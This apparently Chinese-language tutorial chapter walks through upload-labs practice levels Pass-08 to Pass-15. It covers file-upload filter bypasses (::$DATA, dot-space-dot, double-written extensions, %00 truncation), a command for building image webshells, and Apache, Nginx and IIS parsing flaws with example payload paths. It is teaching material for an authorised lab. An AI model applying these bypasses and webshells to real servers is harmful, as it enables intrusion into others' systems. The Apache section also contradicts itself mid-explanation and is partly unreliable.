我们来总结一下：

### 文件头检查绕过的核心思想 🎯

**只要文件开头是合法的图片格式，后面加什么内容都不管！**

不管是检查2个字节、用 `getimagesize()`，还是用 `exif_imagetype()`，它们都只检查文件是不是"看起来像图片"，而不会检查文件的全部内容。

所以我们只要在PHP代码前面加上完整的图片数据，就能轻松绕过这些检查。

这就像：
- 检查的人只看封面，不看内容
- 我们只要把封面做成图片的样子，里面藏什么都行

### 图片马的利用条件 ⚠️

图片马虽然能上传上去，但它不能直接使用，需要配合其他漏洞：

1. **文件包含漏洞**：用include/require把图片马当成PHP文件包含进来
2. **解析漏洞**：服务器错误地把.jpg文件当成PHP解析
3. **其他能执行文件的漏洞**

所以图片马只是第一步，还需要有其他漏洞配合才能真正拿到权限。

### 制作图片马的方法回顾 🛠️

方法1（推荐）：
```cmd
copy 图片.jpg /b + 木马.php /a 图片马.jpg
```

方法2：
- 用编辑器打开图片，最后面加PHP代码

方法3：
- 用十六进制编辑器在文件末尾添加PHP代码

大家记住这些方法，以后遇到检查图片的关卡，直接用图片马就对了！💪

---

## 解析漏洞简介 🕳️

既然提到了解析漏洞，那我们就来简单介绍一下。解析漏洞也是文件上传漏洞利用中非常重要的一环。

### 什么是解析漏洞？

**解析漏洞**，简单说就是：服务器错误地把不是PHP的文件，当成PHP文件来解析执行了。

比如：
- 文件名是 `shell.php.jpg`，明明后缀是.jpg，是图片，但服务器却把它当成PHP执行了
- 这就是解析漏洞

举个生活例子 📚：
> 学校图书馆有规定，只有封面写着"教材"的书才能带进教室。但是有个图书管理员比较笨，他看书名的时候是从后往前看的，只要看到"教材"两个字就认为是教材。
> 
> 于是你把漫画书的名字改成了《漫画教材版》。管理员从后往前看，看到"教材"两个字，就以为是教材，放你进去了。
> 
> 解析漏洞就是类似的道理：服务器解析后缀名的逻辑有问题，导致不是PHP的文件也被当成PHP执行了。

### 常见的解析漏洞

#### 1. Apache解析漏洞 🏺

Apache有个特性：它会从右往左找后缀名，遇到不认识的后缀就继续往左找，直到找到认识的为止。

比如文件名是 `shell.php.jpg`：
- Apache从右往左看，先看到.jpg → 不认识？不对，.jpg是认识的。
- 等等，实际情况是这样的：Apache根据 `AddType` 配置来解析。
- 如果配置了 `AddType application/x-httpd-php .php`，那.php后缀的文件会被当成PHP执行。
- 但是如果有多个后缀，Apache会从右往左找，找第一个能识别的"处理器"。

举个经典的例子：`shell.php.rar`
- 如果Apache不认识.rar后缀，它会继续往左找
- 找到.php，认识，于是当成PHP执行
- 结果 `shell.php.rar` 这个文件就被当成PHP执行了

**注意**：这个和Apache的配置有关，不是所有情况都适用。

#### 2. Nginx解析漏洞 🌊

Nginx也有解析漏洞，比较经典的是**文件名逻辑漏洞**。

比如访问：
```
http://xxx.com/upload/shell.jpg/1.php
```

当Nginx找不到 `/upload/shell.jpg/1.php` 这个文件的时候，它会"向前找"，看看 `shell.jpg` 这个文件在不在。如果在，就把 `shell.jpg` 当成PHP来解析。

于是，我们上传一张图片马 `shell.jpg`，然后访问 `shell.jpg/1.php`，Nginx就会把shell.jpg当成PHP执行！

这个漏洞在某些版本的Nginx中存在。

#### 3. IIS 6.0解析漏洞 💻

IIS 6.0有两个著名的解析漏洞：

**(1) 目录解析漏洞**
- 如果你建立一个名字叫 `xxx.asp` 的文件夹，那么这个文件夹里的所有文件都会被当成ASP解析
- 比如 `test.asp/1.jpg` 会被当成ASP执行

**(2) 文件名解析漏洞**
- 文件名里分号后面的内容会被忽略
- 比如 `shell.asp;jpg` 会被当成 `shell.asp` 来执行

IIS 6.0虽然比较老了，但在一些老系统里还能遇到。

### 解析漏洞的作用

解析漏洞配合文件上传，威力无穷！

比如：
- 服务器只允许上传图片
- 但是有Apache解析漏洞
- 我们上传 `shell.php.jpg`
- 虽然后缀是.jpg，但服务器会把它当成PHP执行
- 直接拿到权限！

所以解析漏洞是文件上传漏洞利用中非常重要的一个知识点。不过这里我们就不展开讲了，大家先有个印象就行。

---

## 本章总结 🎉

时间过得真快！这一章我们又拿下了8关（Pass-08到Pass-15）。让我们来总结一下这一章学到的东西。

### 我们学到了什么？📚

#### 1. ::$DATA绕过（Pass-08）
- 利用Windows NTFS文件系统的特性
- 文件名后面加 `::$DATA`，Windows会自动去掉
- 过滤检查的时候后缀不是.php，放行
- 保存的时候变成.php，成功绕过
- 只适用于Windows系统

#### 2. 点+空格+点绕过（Pass-09）
- 利用程序处理文件名的逻辑漏洞
- 构造特殊的文件名，让程序处理"不干净"
- 核心思想：找到处理逻辑的缺陷

#### 3. 双写后缀绕过（Pass-10）
- 利用 `str_replace()` 只替换一次的特性
- 把 `php` 写成 `pphphp`
- 中间的php被替换掉，两边拼起来还是php
- 经典的绕过思想，很多场景都能用

#### 4. %00截断（Pass-11、Pass-12）
- 利用空字节截断字符串
- 上传路径可控的时候可以用
- GET型：直接在URL里写 `%00`
- POST型：需要在Burp的Hex里改成00
- 前提条件：PHP < 5.3.4，magic_quotes_gpc关闭

#### 5. 文件头检查绕过（Pass-13、14、15）
- 利用图片马绕过
- Pass-13：检查前2字节 → 图片马绕过
- Pass-14：getimagesize() → 图片马绕过
- Pass-15：exif_imagetype() → 图片马绕过
- 核心：只要文件开头是图片就行，后面加什么不管
- 图片马需要配合文件包含或解析漏洞才能利用

### 核心思想总结 💡

回顾这8关，我们能发现一个共同的规律：

**防护程序总有考虑不周的地方，我们只要找到这些"盲区"，就能绕过！**

就像打游戏找Bug一样，只要你足够细心，总能找到漏洞。

### 给新手的建议 🌟

1. **多动手实践**：光看是学不会的，一定要亲手操作一遍
2. **理解原理**：不要死记硬背方法，要理解为什么能绕过
3. **举一反三**：学会一种方法后，想想还能怎么变形
4. **多思考**：如果你是开发者，你会怎么修复这些漏洞？

### 下章预告 📢

下一章我们要挑战Pass-16到Pass-21，难度继续升级！我们会学到：

- 图片马的进阶玩法
- 二次渲染绕过
- 条件竞争漏洞
- 更多高级的绕过技巧

这些技巧更加考验我们的技术水平，也更加有趣！大家准备好了吗？

我们下一章再见！👋

---

> 💡 **小提示**：学习安全技术一定要在合法授权的环境下进行哦！我们搭建靶场练习，就是为了合法合规地学习技术。千万不要用学到的技术去做违法的事情！
